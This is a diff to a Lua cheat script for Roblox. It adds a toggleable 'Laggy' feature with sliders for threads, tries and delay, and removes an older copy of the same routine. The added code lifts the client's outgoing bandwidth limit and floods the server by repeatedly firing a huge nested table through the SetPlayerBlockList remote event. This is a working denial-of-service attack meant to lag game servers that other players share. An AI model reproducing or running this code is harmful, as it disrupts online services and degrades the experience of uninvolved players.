@@ -1945,8 +1945,78 @@ end
 ---------------------------------------------
 local function LAGGYconfig()
     LG1:Cheat("Label"," Is a BETA Version // Enjoy ")
+   --test New Lag
+LG1:Cheat("Checkbox","Enable Laggy ", function(bool)
+	print(bool)
+	Settings.EnableLag = bool
+	saveSettings()
+end,{enabled = Settings.EnableLag})
 
-    LG1:Cheat("Textbox", "LAG Threads", function(Value)
+task.spawn(function()
+	while task.wait() do
+		if Settings.EnableLag then
+    delaylag = tonumber(Settings.delag or 1.5)
+    while wait(tonumber(Settings.delag or 1.5)) do --// don't change it's the best
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
+    local function getmaxvalue(val)
+       local mainvalueifonetable = 499999
+       if type(val) ~= "number" then
+           return nil
+       end
+       local calculateperfectval = (mainvalueifonetable/(val+2))
+       return calculateperfectval
+    end
+     
+    --local function bomb(tableincrease, tries)
+function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    
+    table.insert(spammedtable, {})
+    z = spammedtable[1]
+
+    tableincrease = tonumber(Settings.max or 22)
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+     
+    local calculatemax = getmaxvalue(tableincrease)
+    local maximum
+     
+    if calculatemax then
+         maximum = calculatemax
+         else
+         maximum = 999999
+    end
+     
+    for i = 1, maximum do
+         table.insert(maintable, spammedtable)
+    end
+     
+    --tries = tonumber(Settings.mix or 1.5)
+    for i = 1, tries do
+         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+    end
+end
+    
+    tableincrease = tonumber(Settings.max or 22)
+    --tries = tonumber(Settings.mix or 1.5)
+
+    if Settings.EnableLag then
+        bomb(tableincrease, tonumber(Settings.mix))
+    elseif not Settings.EnableLag then
+        bomb(tableincrease, 0)
+    end
+    --bomb(tableincrease, tries)
+    --repeat task.wait() until not Settings.EnableLag
+            end
+        end
+    end
+end)
+
+    --[[LG1:Cheat("Textbox", "LAG Threads", function(Value)
         print("LAG threads.:", Value)
         Settings.max = tonumber(Value)
         saveSettings()
@@ -1962,29 +2032,34 @@ local function LAGGYconfig()
         print("Delay.:", Value)
         Settings.delag = tonumber(Value)
         saveSettings()
-    end, {placeholder = Settings.delag or 1.5})
+    end, {placeholder = Settings.delag or 1.5})]]
 
+    LG1:Cheat("Label","LAG Threads : "..tonumber(Settings.max))  
+    LG1:Cheat("Slider", "LAG Threads [slide]", function(Value)
+        print("LAG Lv.:", Value)
+        Settings.max = tonumber(Value)
+        saveSettings()
+    end, {min = 0, max = 250, suffix = "", default = 22 })
+
+    LG1:Cheat("Label","LAG Lv : "..tonumber(Settings.mix)) 
     LG1:Cheat("Slider", "LAG Lv. [slide]", function(Value)
         print("LAG Lv.:", Value)
         Settings.mix = tonumber(Value)
         saveSettings()
-    end, {min = 0, max = 7, suffix = "", default = 0 })
+    end, {min = 1, max = 7, suffix = "", default = 1.2 })
 
+    LG1:Cheat("Label","Delay : "..tonumber(Settings.delag)) 
     LG1:Cheat("Slider", "Delay [slide]", function(Value)
         print("Delay.:", Value)
         Settings.delag = tonumber(Value)
         saveSettings()
-    end, {min = 0, max = 10, suffix = "", default = 1.5 })
+    end, {min = 0.1, max = 10, suffix = "", default = 1.5 })
 
-
-    LG1:Cheat("Label","  ")
-    LG1:Cheat("Label"," Set Tries to 0 for close LAG ")
     LG1:Cheat("Label"," Threads = lower the faster it lags ")
     LG1:Cheat("Label"," Tries = the higher the faster it lags ")
     LG1:Cheat("Label"," Delay = lower the faster it lags")
     LG1:Cheat("Label"," def settings : threads = 250, tries = 1, Delay = 1.5 ")
-    LG1:Cheat("Label"," fast-lag settings: threads = 10, tries = 1.5, Delay = 1.5 ")
-
+    LG1:Cheat("Label"," fast-lag settings : threads = 10, tries = 1.5, Delay = 1.5 ")
 
 end
 ----------------------------------------------
@@ -5249,67 +5324,4 @@ warn("Display Error Hider!!!")
 
 warn("Hider Name Loaded!!!")
 warn("AA v2 Loaded!!!")
-
---testlag
-function Laggy()
-    delaylag = tonumber(Settings.delag or 1.5)
-    while wait(tonumber(Settings.delag or 1.5)) do --// don't change it's the best
-    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
-    local function getmaxvalue(val)
-       local mainvalueifonetable = 499999
-       if type(val) ~= "number" then
-           return nil
-       end
-       local calculateperfectval = (mainvalueifonetable/(val+2))
-       return calculateperfectval
-    end
-     
-    local function bomb(tableincrease, tries)
-    local maintable = {}
-    local spammedtable = {}
-    
-    table.insert(spammedtable, {})
-    z = spammedtable[1]
-
-    tableincrease = tonumber(Settings.max or 22)
-    for i = 1, tableincrease do
-        local tableins = {}
-        table.insert(z, tableins)
-        z = tableins
-    end
-     
-    local calculatemax = getmaxvalue(tableincrease)
-    local maximum
-     
-    if calculatemax then
-         maximum = calculatemax
-         else
-         maximum = 999999
-    end
-     
-    for i = 1, maximum do
-         table.insert(maintable, spammedtable)
-    end
-     
-    tries = tonumber(Settings.mix or 0)
-    for i = 1, tries do
-         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-    end
-end
-    
-    tableincrease = tonumber(Settings.max or 22)
-    tries = tonumber(Settings.mix or 0)
-     
-    bomb(tableincrease, tries)
-
-    end
-end
-
-if  Laggy() == false then
-        Laggy() 
-    end
-if Laggy() == true then
-        notLaggy()
-end
-
 warn("All Loaded !!!")
